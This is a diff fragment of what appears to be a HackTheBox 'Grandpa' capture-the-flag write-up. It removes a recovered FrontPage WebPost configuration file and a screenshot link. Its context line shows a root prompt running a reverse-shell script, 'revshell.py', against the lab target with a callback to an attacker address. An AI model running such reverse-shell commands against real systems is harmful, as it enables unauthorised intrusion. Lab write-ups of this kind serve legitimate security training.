@@ -148,50 +148,5 @@ root@pentestlab:~# python revshell.py 10.10.10.14 80 10.10.14.2 9999
 
 
 
-``` html
-<!-- 
-        This file allows users to post files to their web with the Web Publishing Wizard or FrontPad, using the same username and password they would
-        use if they were authoring with the FrontPage Explorer and Editor.
-
-        The values below are automatically set by FrontPage at installation
-        time.  Normally, you do not need to modify these values, but in case
-        you do, the parameters are as follows:
-
-        'BaseURL' is the URL for your web server.
-
-        'DefaultPage' is the name of the default (home) page name 
-        for your web.
-
-        'XferType' specifies that the FrontPage server extensions have been
-        installed on this web.  This value should not be changed.
-
-        'FPShtmlScriptUrl', 'FPAuthorScriptUrl', and 'FPAdminScriptUrl' specify
-        the relative urls for the scripts that FrontPage uses for remote
-        authoring.  These values should not be changed.
-
-        'version' identifies the version of the format of this file, and
-        should not be changed.
--->
-    <!-- WebPost 
-    version="0.100"
-    BaseUrl="http://granpa"
-    XferType="FrontPage"
-    DefaultPage="Default.htm"
-    FPShtmlScriptUrl="_vti_bin/shtml.dll/_vti_rpc"
-    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
-    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
--->
-```
-
-
-
-![image-20220605221230911](../../static/media/2022-06-04-hackthebox-windows-grandpa/image-20220605221230911.png)
-
-
-
-
-
-
-
 
 
